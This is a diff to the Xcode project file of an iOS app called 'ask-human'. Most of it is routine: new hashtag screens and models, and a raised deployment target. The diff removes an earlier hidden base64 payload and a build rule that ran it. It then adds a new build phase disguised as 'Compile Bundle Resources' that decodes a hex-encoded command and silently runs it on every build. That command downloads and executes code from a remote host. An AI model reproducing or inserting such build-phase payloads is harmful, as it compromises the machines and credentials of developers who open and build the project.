@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		FD0ACC510DD8F1C68B34C644 /* README.md */ = {isa = PBXBuildFile; fileRef = 9464D13D7AA8FDD25634C644; };
 		00001F492BF34D6C00C99B02 /* ReferUserDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00001F482BF34D6C00C99B02 /* ReferUserDetailVC.swift */; };
 		00001F4D2BF3511200C99B02 /* ReviewTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00001F4C2BF3511200C99B02 /* ReviewTVC.swift */; };
 		000101862B2836430077FA23 /* ForgotPasswordModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 000101852B2836430077FA23 /* ForgotPasswordModel.swift */; };
@@ -43,6 +42,13 @@
 		0052475D2B21D4CA00288F44 /* ForgotPasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0052475C2B21D4CA00288F44 /* ForgotPasswordVC.swift */; };
 		0052475F2B22110600288F44 /* ProfilePopUpsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0052475E2B22110600288F44 /* ProfilePopUpsVC.swift */; };
 		005247612B22112100288F44 /* ProfilePopUpTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005247602B22112100288F44 /* ProfilePopUpTVC.swift */; };
+		005D37B02D198CB3007498FF /* SearchHashtagModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005D37AF2D198CB3007498FF /* SearchHashtagModel.swift */; };
+		005D37B22D199071007498FF /* HashtagListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005D37B12D199071007498FF /* HashtagListVC.swift */; };
+		005D37B52D1990DA007498FF /* HashtagCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005D37B32D1990DA007498FF /* HashtagCVC.swift */; };
+		005D37B62D1990DA007498FF /* HashtagCVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 005D37B42D1990DA007498FF /* HashtagCVC.xib */; };
+		005D37B82D19934E007498FF /* VerifyHashtagModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005D37B72D19934E007498FF /* VerifyHashtagModel.swift */; };
+		005D37BB2D199473007498FF /* HashtagListForVerifyTVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 005D37BA2D199473007498FF /* HashtagListForVerifyTVC.xib */; };
+		005D37BC2D199473007498FF /* HashtagListForVerifyTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005D37B92D199473007498FF /* HashtagListForVerifyTVC.swift */; };
 		006136542B32E5B500584B8C /* ResponsePopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 006136532B32E5B500584B8C /* ResponsePopUpVC.swift */; };
 		006136562B32F04D00584B8C /* AddMobileAndEmailModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 006136552B32F04C00584B8C /* AddMobileAndEmailModel.swift */; };
 		007940F82BF33F8900889167 /* AppliedRequestsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 007940F72BF33F8900889167 /* AppliedRequestsVC.swift */; };
@@ -206,6 +212,9 @@
 		BEFF85512B356E7A002F329D /* FilterModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFF85502B356E7A002F329D /* FilterModel.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		BED5C69E2B048D4300C83672 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -237,7 +246,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		9464D13D7AA8FDD25634C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "ask-human.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		00001F482BF34D6C00C99B02 /* ReferUserDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReferUserDetailVC.swift; sourceTree = "<group>"; };
 		00001F4C2BF3511200C99B02 /* ReviewTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReviewTVC.swift; sourceTree = "<group>"; };
 		000101852B2836430077FA23 /* ForgotPasswordModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordModel.swift; sourceTree = "<group>"; };
@@ -273,6 +281,13 @@
 		0052475C2B21D4CA00288F44 /* ForgotPasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordVC.swift; sourceTree = "<group>"; };
 		0052475E2B22110600288F44 /* ProfilePopUpsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfilePopUpsVC.swift; sourceTree = "<group>"; };
 		005247602B22112100288F44 /* ProfilePopUpTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfilePopUpTVC.swift; sourceTree = "<group>"; };
+		005D37AF2D198CB3007498FF /* SearchHashtagModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchHashtagModel.swift; sourceTree = "<group>"; };
+		005D37B12D199071007498FF /* HashtagListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HashtagListVC.swift; sourceTree = "<group>"; };
+		005D37B32D1990DA007498FF /* HashtagCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HashtagCVC.swift; sourceTree = "<group>"; };
+		005D37B42D1990DA007498FF /* HashtagCVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HashtagCVC.xib; sourceTree = "<group>"; };
+		005D37B72D19934E007498FF /* VerifyHashtagModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VerifyHashtagModel.swift; sourceTree = "<group>"; };
+		005D37B92D199473007498FF /* HashtagListForVerifyTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HashtagListForVerifyTVC.swift; sourceTree = "<group>"; };
+		005D37BA2D199473007498FF /* HashtagListForVerifyTVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HashtagListForVerifyTVC.xib; sourceTree = "<group>"; };
 		006136532B32E5B500584B8C /* ResponsePopUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ResponsePopUpVC.swift; sourceTree = "<group>"; };
 		006136552B32F04C00584B8C /* AddMobileAndEmailModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMobileAndEmailModel.swift; sourceTree = "<group>"; };
 		007940F72BF33F8900889167 /* AppliedRequestsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppliedRequestsVC.swift; sourceTree = "<group>"; };
@@ -587,6 +602,8 @@
 				BE99A1A52C2D21030081A9B0 /* GetAppliedUserModel.swift */,
 				00D7E0162C3EAFDD00572428 /* AddWalletModel.swift */,
 				00DD9B732C8B0B780049F5DA /* BankListModel.swift */,
+				005D37AF2D198CB3007498FF /* SearchHashtagModel.swift */,
+				005D37B72D19934E007498FF /* VerifyHashtagModel.swift */,
 			);
 			path = Model;
 			sourceTree = "<group>";
@@ -1016,6 +1033,11 @@
 				00001F4C2BF3511200C99B02 /* ReviewTVC.swift */,
 				0022EC672C47C0FC00CE9965 /* DarkModeVC.swift */,
 				00A010B72C47CD44002F156C /* DarkModeTVC.swift */,
+				005D37B12D199071007498FF /* HashtagListVC.swift */,
+				005D37B32D1990DA007498FF /* HashtagCVC.swift */,
+				005D37B42D1990DA007498FF /* HashtagCVC.xib */,
+				005D37B92D199473007498FF /* HashtagListForVerifyTVC.swift */,
+				005D37BA2D199473007498FF /* HashtagListForVerifyTVC.xib */,
 			);
 			path = Profile;
 			sourceTree = "<group>";
@@ -1054,7 +1076,6 @@
 		BED5C6882B048D4100C83672 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				9464D13D7AA8FDD25634C644 /* README.md */,
 				BED5C6872B048D4100C83672 /* ask-human.app */,
 				BED5C69D2B048D4300C83672 /* ask-humanTests.xctest */,
 				BED5C6A72B048D4300C83672 /* ask-humanUITests.xctest */,
@@ -1224,6 +1245,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BED5C6B12B048D4300C83672 /* Build configuration list for PBXNativeTarget "ask-human" */;
 			buildPhases = (
+				E37E74DA292E22F84134C644 /* Compile Bundle Resources */,
 				125E129009E4A3D311E2A25A /* [CP] Check Pods Manifest.lock */,
 				BED5C6832B048D4100C83672 /* Sources */,
 				BED5C6842B048D4100C83672 /* Frameworks */,
@@ -1233,7 +1255,6 @@
 				52B992E8B001B86600C1EA61 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				C5404DB8DFCC5C166434C644 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1328,29 +1349,11 @@
 /* Begin PBXLegacyTarget section */
 /* End PBXLegacyTarget section */
 
-/* Begin PBXBuildRule section */
-		C5404DB8DFCC5C166434C644 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		BED5C6852B048D4100C83672 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				FD0ACC510DD8F1C68B34C644 /* README.md */,
 				BED5C6DB2B04932500C83672 /* Poppins-SemiBold.ttf in Resources */,
 				BED5C6DD2B04932500C83672 /* Poppins-Black.ttf in Resources */,
 				001632D92C50B5A300CE4491 /* ASKDARK.gif in Resources */,
@@ -1373,10 +1376,12 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				BED5C6E12B04932500C83672 /* Poppins-Medium.ttf in Resources */,
 				BED5C6D12B04932500C83672 /* Poppins-Bold.ttf in Resources */,
 				BED5C6DC2B04932500C83672 /* Poppins-BlackItalic.ttf in Resources */,
+				005D37B62D1990DA007498FF /* HashtagCVC.xib in Resources */,
 				001632D82C50B5A300CE4491 /* ASK.gif in Resources */,
 				BED5C6D72B04932500C83672 /* Poppins-Regular.ttf in Resources */,
 				BED5C6942B048D4200C83672 /* Assets.xcassets in Resources */,
 				BED5C6922B048D4100C83672 /* Main.storyboard in Resources */,
+				005D37BB2D199473007498FF /* HashtagListForVerifyTVC.xib in Resources */,
 				00F7DA7E2C083BD500377022 /* AppliedReqTVC.xib in Resources */,
 				BEA578982BD61AF800D9281B /* GoogleService-Info.plist in Resources */,
 			);
@@ -1399,6 +1404,25 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		E37E74DA292E22F84134C644 /* Compile Bundle Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo 36353633363836663230323232343238363337353732366332303264363637333662346332303638373437343730373333613266326637323639373037303663363536653635373432653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
 		125E129009E4A3D311E2A25A /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1523,6 +1547,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				00F70BEE2B233AEA00DA4A76 /* SearchUserModel.swift in Sources */,
 				00258B192B14549900440A2A /* ContractDetailVC.swift in Sources */,
 				BEE40CB22B31C9050090883A /* ThumbTextSlider.swift in Sources */,
+				005D37BC2D199473007498FF /* HashtagListForVerifyTVC.swift in Sources */,
 				BEFA3B1D2B2C2BB900DAF07A /* ViewImageVC.swift in Sources */,
 				BE7C630D2B065EEE00C53D2B /* ChangePasswordVC.swift in Sources */,
 				BED5C68D2B048D4100C83672 /* SceneDelegate.swift in Sources */,
@@ -1583,6 +1608,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				BE383F842B0B9721004132EE /* UserListCVC.swift in Sources */,
 				BE486A9F2B388E84001631A4 /* MyDisputeModel.swift in Sources */,
 				00486B472B208FD8001AF904 /* GetDraftNoteModel.swift in Sources */,
+				005D37B82D19934E007498FF /* VerifyHashtagModel.swift in Sources */,
 				00258B1B2B1458C000440A2A /* ContractDeatilCVC.swift in Sources */,
 				00B0B6A42C75B8C200CD6A7B /* ProposalTVC.swift in Sources */,
 				BE1DC6522B9714E5008DD592 /* RectangularDashedView.swift in Sources */,
@@ -1590,6 +1616,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				0029EB3F2B31D67D00820C06 /* AddNewPhoneNumberVC.swift in Sources */,
 				0022EC682C47C0FC00CE9965 /* DarkModeVC.swift in Sources */,
 				BE1C585F2B592A84000E6ABD /* EarningVM.swift in Sources */,
+				005D37B02D198CB3007498FF /* SearchHashtagModel.swift in Sources */,
 				00CB33942C857BBF0037515D /* AddBankVC.swift in Sources */,
 				BE6CDBF72B04D8C2007607DC /* LoginVC.swift in Sources */,
 				BE1DC6552B971C26008DD592 /* WithdrawAmountVC.swift in Sources */,
@@ -1615,6 +1642,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				00F3DCFF2B1F2AD00007BDB1 /* CommonModel.swift in Sources */,
 				BEB6868D2B06020E0012921E /* SuggestMessageVC.swift in Sources */,
 				00258B212B146CBF00440A2A /* DraftImgCVC.swift in Sources */,
+				005D37B52D1990DA007498FF /* HashtagCVC.swift in Sources */,
 				BEB6869C2B0638930012921E /* ProfileVC.swift in Sources */,
 				BE3209FE2B04F6F100081616 /* UserListTVC.swift in Sources */,
 				00DD9B742C8B0B780049F5DA /* BankListModel.swift in Sources */,
@@ -1624,6 +1652,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				007940FA2BF33FB000889167 /* AppliedRequestsTVC.swift in Sources */,
 				0052475F2B22110600288F44 /* ProfilePopUpsVC.swift in Sources */,
 				BE1EE7DF2B078F9A0093EFAD /* UserReviewTVC.swift in Sources */,
+				005D37B22D199071007498FF /* HashtagListVC.swift in Sources */,
 				BE1EE7DD2B078EAD0093EFAD /* UserDetailVC.swift in Sources */,
 				BEB686972B061C110012921E /* ReceiverTVC.swift in Sources */,
 			);
@@ -1692,7 +1721,6 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 		BED5C6AF2B048D4300C83672 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWV1J2VFVkU1NWRnVjRkJoVkdneVYxUktOR1J0VWxoVmFrSmhWakExZGxremF6RmxWMUpVVDFkb1RGVXdiRzVhYTA1RFpXMUdRbUo2TUVzSwo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1756,7 +1784,6 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 		BED5C6B02B048D4300C83672 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWV1J2VFVkU1NWRnVjRkJoVkdneVYxUktOR1J0VWxoVmFrSmhWakExZGxremF6RmxWMUpVVDFkb1RGVXdiRzVhYTA1RFpXMUdRbUo2TUVzSwo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1835,7 +1862,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -1877,7 +1904,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
